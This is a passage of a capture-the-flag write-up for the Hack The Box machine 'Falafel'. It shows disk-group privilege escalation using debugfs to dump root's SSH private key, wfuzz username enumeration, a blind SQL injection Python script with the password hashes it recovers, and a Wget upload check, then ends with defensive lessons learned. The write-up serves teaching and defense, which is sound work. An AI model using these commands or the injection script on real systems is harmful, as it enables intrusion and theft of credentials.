root@kali:~/Desktop/htb/falafel# ssh yossi@10.10.10.73
yossi@10.10.10.73's password:                                                        
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)                   
                                                                                     
 * Documentation:  https://help.ubuntu.com                                           
 * Management:     https://landscape.canonical.com                                   
 * Support:        https://ubuntu.com/advantage                                      
                                                                                     
0 packages can be updated.                                                           
0 updates are security updates.
```

We’re in! Run the _id_ command to view the real and effective user ids for the _yossi_ user.

```text
yossi@falafel:~$ id
uid=1000(yossi) gid=1000(yossi) groups=1000(yossi),4(adm),6(disk),24(cdrom),30(dip),46(plugdev),117(lpadmin),118(sambashare)
```

The user is part of the group _disk_, which gives the user full access to any block devices contained within _/dev/_. Having access to this is almost equivalent to root access.

```text
yossi@falafel:~$ ls -la /dev/sda1
brw-rw---- 1 root disk 8, 1 Jan 30 19:49 /dev/sda1
```

We can use _debugfs_ to enumerate the entire disk with effectively root level privileges.

```text
yossi@falafel:~$ debugfs /dev/sda1
debugfs 1.42.13 (17-May-2015)
debugfs:  cd /root
debugfs:  ls
debugfs:  cd .ssh
debugfs:  ls
debugfs:  cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyPdlQuyVr/L4xXiDVK8lTn88k4zVEEfiRVQ1AWxQPOHY7q0h
b+Zd6WPVczObUnC+TaElpDXhf3gjLvjXvn7qGuZekNdB1aoWt5IKT90yz9vUx/gf
v22+b8XdCdzyXpJW0fAmEN+m5DAETxHDzPdNfpswwYpDX0gqLCZIuMC7Z8D8Wpkg
BWQ5RfpdFDWvIexRDfwj/Dx+tiIPGcYtkpQ/UihaDgF0gwj912Zc1N5+0sILX/Qd
UQ+ZywP/qj1FI+ki/kJcYsW/5JZcG20xS0QgNvUBGpr+MGh2urh4angLcqu5b/ZV
dmoHaOx/UOrNywkp486/SQtn30Er7SlM29/8PQIDAQABAoIBAQCGd5qmw/yIZU/1
eWSOpj6VHmee5q2tnhuVffmVgS7S/d8UHH3yDLcrseQhmBdGey+qa7fu/ypqCy2n
gVOCIBNuelQuIAnp+EwI+kuyEnSsRhBC2RANG1ZAHal/rvnxM4OqJ0ChK7TUnBhV
+7IClDqjCx39chEQUQ3+yoMAM91xVqztgWvl85Hh22IQgFnIu/ghav8Iqps/tuZ0
/YE1+vOouJPD894UEUH5+Bj+EvBJ8+pyXUCt7FQiidWQbSlfNLUWNdlBpwabk6Td
OnO+rf/vtYg+RQC+Y7zUpyLONYP+9S6WvJ/lqszXrYKRtlQg+8Pf7yhcOz/n7G08
kta/3DH1AoGBAO0itIeAiaeXTw5dmdza5xIDsx/c3DU+yi+6hDnV1KMTe3zK/yjG
UBLnBo6FpAJr0w0XNALbnm2RToX7OfqpVeQsAsHZTSfmo4fbQMY7nWMvSuXZV3lG
ahkTSKUnpk2/EVRQriFjlXuvBoBh0qLVhZIKqZBaavU6iaplPVz72VvLAoGBANj0
GcJ34ozu/XuhlXNVlm5ZQqHxHkiZrOU9aM7umQkGeM9vNFOwWYl6l9g4qMq7ArMr
5SmT+XoWQtK9dSHVNXr4XWRaH6aow/oazY05W/BgXRMxolVSHdNE23xuX9dlwMPB
f/y3ZeVpbREroPOx9rZpYiE76W1gZ67H6TV0HJcXAoGBAOdgCnd/8lAkcY2ZxIva
xsUr+PWo4O/O8SY6vdNUkWIAm2e7BdX6EZ0v75TWTp3SKR5HuobjVKSht9VAuGSc
HuNAEfykkwTQpFTlmEETX9CsD09PjmsVSmZnC2Wh10FaoYT8J7sKWItSzmwrhoM9
BVPmtWXU4zGdST+KAqKcVYubAoGAHR5GBs/IXFoHM3ywblZiZlUcmFegVOYrSmk/
k+Z6K7fupwip4UGeAtGtZ5vTK8KFzj5p93ag2T37ogVDn1LaZrLG9h0Sem/UPdEz
HW1BZbXJSDY1L3ZiAmUPgFfgDSze/mcOIoEK8AuCU/ejFpIgJsNmJEfCQKfbwp2a
M05uN+kCgYBq8iNfzNHK3qY+iaQNISQ657Qz0sPoMrzQ6gAmTNjNfWpU8tEHqrCP
NZTQDYCA31J/gKIl2BT8+ywQL50avvbxcXZEsy14ExVnaTpPQ9m2INlxz97YLxjZ
FEUbkAlzcvN/S3LJiFbnkQ7uJ0nPj4oPw1XBcmsQoBwPFOcCEvHSrg==
-----END RSA PRIVATE KEY-----
debugfs:  quit
```

Save the RSA private key in the file _root\_id\_rsa_ on the attack machine and change the permissions on the file.

```text
chmod 600 root_id_rsa
```

SSH into the root account.

```text
ssh -i root_id_rsa root@10.10.10.73
```

Grab the _root.txt_ flag.

![](https://miro.medium.com/max/589/1*q9Cjwm48f6xv9i_DPsfY-Q.png)

## Extra Content <a id="8cb4"></a>

After rooting the machine, I watched [ippsec’s video](https://www.youtube.com/watch?v=CUbWpteTfio) and wanted to share a few cool things that he tried that I didn’t think of trying.

**1- Username Enumeration**

Since the login form outputs a verbose message that indicates to us whether a username exists in the system or not, we can run an automated attack to enumerate usernames. This can be done using a tool called _wfuzz._

First, intercept the login request in Burp.

![](https://miro.medium.com/max/755/1*6DgulCJyu71GMWdCDzfHEw.png)

We’re dealing with a POST request and we want to enumerate the field “_username_” field. In _wfuzz_, run the following command.

```text
wfuzz -c -z file,/root/Desktop/tools/SecLists/Usernames/Names/names.txt --hs "Try again" -d "username=FUZZ&password=anything" http://10.10.10.73/login.php
```

* **-c:** Output with colors
* -**z:** payload for each FUZZ keyword used in the form
* **-hs:** hide responses with the specified regex within the content
* **-d:** use post data

We get back the following result showing that “_admin_” and “_chris_” are valid usernames.

```text
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************Target: http://10.10.10.73/login.php
Total requests: 10163===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                 
===================================================================000000086:   200        102 L    659 W    7091 Ch     "admin"                                                                                                                                 
000001883:   200        102 L    659 W    7091 Ch     "chris"Total time: 117.7351
Processed Requests: 10163
Filtered Requests: 10161
Requests/sec.: 86.32089
```

**2- Manual Exploitation of SQL Injection**

As mentioned at the beginning of the blog, this was a blind SQL injection where you had to ask the application true and false questions in order to enumerate every character of the hashed password. We did this with an automated tool called SQLMap, however, this could have easily been done with the following simple script \(sqli-exploit.py\).

```text
import requestschars = "0123456789abcdef"def GetSQL(i,c):
    return "admin' and substr(password,%s,1) = '%s' -- -" % (i,c)for i in range(1,33):
    for c in chars:
        injection = GetSQL(i,c)
        payload = {'username':injection,'password':"randompassword"}
        r = requests.post('http://10.10.10.73/login.php',data=payload)
        if 'Wrong identification' in r.text:
            print(c,end='',flush=True)
            breakprint()
```

The idea behind the script is that we loop through all the possible characters in an md5 hash \(chars variable\) and ask the application if the first character of the hashed password is equal to the first character of the chars string. If it is not, we ask the application if the first character of the hashed password is equal to the second character of the chars string, and so on until we get the ‘Wrong identification’ error which indicates that the we identified the first character of the password. This is done in a loop until we identify all 32 characters of the md5 hashed password.

The following is an example of using the blind SQL injection to ask the application if the first character of the md5 hashed password is “0”. Since we got the error “Wrong identification”, that is equivalent to the application responding with a “yes it is the first character of the md5 hashed password”.

![](https://miro.medium.com/max/1425/1*N49GoOofwiFIpdzqdIMixQ.png)

Obviously doing something like this by hand is time consuming, so I found it really cool how ippsec did it with the above simple script.

```text
root@kali:~/Desktop/htb/falafel# python3 sqli-exploit.py 
0e462096931906507119562988736854  #admin passwordroot@kali:~/Desktop/htb/falafel# python3 sqli-exploit.py 
d4ee02a22fc872e36d9e3751ba72ddc8 #chris password
```

**3- Wget Arbitrary File Upload Exploit**

When uploading a file, you’ll notice that the application is using Wget version 1.17.1. This can be viewed by setting up a netcat session and then trying to upload a file.

```text
root@kali:~/Desktop/htb/falafel# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.73] 44408
GET /test.png HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.10.14.12:1234
Connection: Keep-Alive
```

This version is vulnerable to an [arbitrary file upload](https://www.exploit-db.com/exploits/40064) vulnerability that allows a user to upload arbitrary files with arbitrary file names, thereby bypassing the validation on the name having to end with a _.png_ extension. The box is not vulnerable to this exploit, but I thought I would still document this technique since it’s not something I would have thought of testing.

## Lessons Learned <a id="a804"></a>

To gain an initial foothold on the box we exploited five vulnerabilities.

1. Verbose message on the login form. The error message allowed us to enumerate a valid username. Therefore, whenever possible, always configure the application to use generic error messages such as “The username or password is incorrect”.
2. An SQL injection that allowed us to bypass authentication. To prevent this vulnerability from occurring, there are [many defenses ](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)that can be put in place, including but not limited to the use of parametrized queries.
3. PHP type juggling vulnerability. When authenticating a user, the application was comparing the password that the user inputs with the password saved in the backend using the equal operator ==. Since it so happens that the admin’s password hash started with the “0e” characters, PHP converted that value to a float that was evaluated to “0”. Therefore, we were able to use any password that had an md5 hash that starts with “0e” to authenticate to the admin user’s account. This vulnerability could have been avoided if the developer used the strict comparison operator === that would have prevented PHP from doing type juggling. For more information, refer to [this link](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09).
4. Lack of input validation on upload functionality that allowed us to gain initial access on the machine. The upload functionality of the website had insufficient validation on the names of uploaded files. Therefore, we were able to upload a malicious file and run the malicious file to gain an initial foothold on the system. Proper input validation checks should be put in place on all user provided input.
5. Cleartext credentials and reuse of credentials that allowed us to pivot to the user _moshe._ After gaining initial access on the box, we found moshe’s database credentials in the _connection.php_ file that the application was using to access the database. _Moshe_ had reused these credentials to access his account and therefore we were able to pivot to _Moshe’s_ account. When possible, credentials should be stored in a secure location with restricted access and users should not use the same credentials for all their accounts.

To escalate privileges we exploited two vulnerabilities.

1. Security misconfiguration of user group permissions that allowed us to pivot to the user _yossi._ The _moshe_ user was part of the _video_ group that allowed us to grab a screenshot of _yossi’s_ screen. Since _yossi_ was changing his password in that screenshot, we were able to access _yossi’s_ account. The administrator should have conformed to the principle of least privilege when assigning permissions to users.
2. Security misconfiguration of user group permissions that allowed us to escalate our privileges to _root_. The _yossi_ user was part of the disk group, which is equivalent to giving the user root level read/write access to any file on the system. Again, the administrator should have conformed to the principle of least privilege when assigning permissions to users.

